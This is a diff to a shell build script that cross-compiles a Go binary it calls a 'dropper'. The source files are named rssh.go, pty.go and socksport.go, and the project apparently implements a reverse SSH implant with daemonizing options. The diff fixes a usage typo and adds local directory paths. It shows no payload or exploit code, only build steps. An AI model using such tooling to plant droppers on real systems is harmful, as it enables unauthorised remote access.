@@ -2,7 +2,7 @@
 
 usage(){
     echo "Error: $2\n"
-    echo "Usage: $1 [build.profileprofile]\n"
+    echo "Usage: $1 [build.profile]\n"
     exit 1
 }
 
@@ -23,6 +23,10 @@ fi
 
 #------------------------- Build --------------------#
 export GOOS=${DropperOS} GOARCH=${DropperArch}
+
+TOP_DIR="/Users/dimas/Code/go/src/sshpipe"
+CODE_DIR="${TOP_DIR}/src"
+OUT_DIR="${TOP_DIR}/out"
 
 echo "[*] Building dropper for ${DropperOS} / ${DropperArch} "
 
@@ -51,8 +55,10 @@ go build -ldflags \
      -X main.LogFile=${LogFile} \
      -X main.PIDFile=${PIDFile}  \
      -X main.Daemonize=${Daemonize}" \
-     -o ${DropperName} \
-     ./rssh.go  ./types.go ./vars.go ./pty.go ./socksport.go ./keymgmt.go ./traffic.go
+     -o ${OUT_DIR}/${DropperName} \
+            ${CODE_DIR}/rssh.go  ${CODE_DIR}/types.go ${CODE_DIR}/vars.go \
+            ${CODE_DIR}/pty.go ${CODE_DIR}/socksport.go ${CODE_DIR}/keymgmt.go \
+            ${CODE_DIR}/traffic.go
 
 if [[ $? -eq 0 ]]
 then
